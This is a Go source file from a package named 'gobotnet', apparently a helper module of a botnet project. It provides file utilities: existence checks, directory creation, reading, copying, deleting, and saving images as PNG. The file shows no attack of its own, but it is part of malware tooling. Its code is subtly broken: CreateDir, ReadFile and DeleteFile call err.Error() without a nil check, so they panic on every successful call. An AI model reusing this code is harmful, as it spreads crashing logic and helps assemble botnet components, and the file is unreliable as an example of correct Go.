package gobotnet

import (
	"errors"
	"image"
	"image/png"
	"io"
	"io/ioutil"
	"os"
)

func CheckFileExist(filePath string) error {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		OutMessage(err.Error())
		return err
	}
	return nil
}

func CreateDir(dirPath string, fileMode os.FileMode) error {
	err := os.MkdirAll(dirPath, fileMode)
	OutMessage(err.Error())
	return err
}

func ReadFile(nameFile string) (bytesFile []byte, err error) {
	readBytes, err := ioutil.ReadFile(nameFile)
	OutMessage(err.Error())
	return readBytes, err
}

func SaveImageToFile(image *image.RGBA, nameFile string) error {
	f, err := os.Create("./" + nameFile)
	if err != nil {
		OutMessage(err.Error())
		return err
	}

	err = png.Encode(f, image)
	if err != nil {
		OutMessage(err.Error())
		return err
	}
	f.Close()

	return nil
}

func CopyFileToDirectory(pathSourceFile string, pathDestFile string) error {
	sourceFile, err := os.Open(pathSourceFile)
	if err != nil {
		OutMessage(err.Error())
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(pathDestFile)
	if err != nil {
		OutMessage(err.Error())
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		OutMessage(err.Error())
		return err
	}

	err = destFile.Sync()
	if err != nil {
		OutMessage(err.Error())
		return err
	}

	sourceFileInfo, err := sourceFile.Stat()
	if err != nil {
		OutMessage(err.Error())
		return err
	}

	destFileInfo, err := destFile.Stat()
	if err != nil {
		OutMessage(err.Error())
		return err
	}

	if sourceFileInfo.Size() == destFileInfo.Size() {
	} else {
		err = errors.New("Bad copy file")
		OutMessage(err.Error())
		return err
	}
	return nil
}

func DeleteFile(nameFile string) error {
	err := os.Remove(nameFile)
	OutMessage(err.Error())
	return err
}
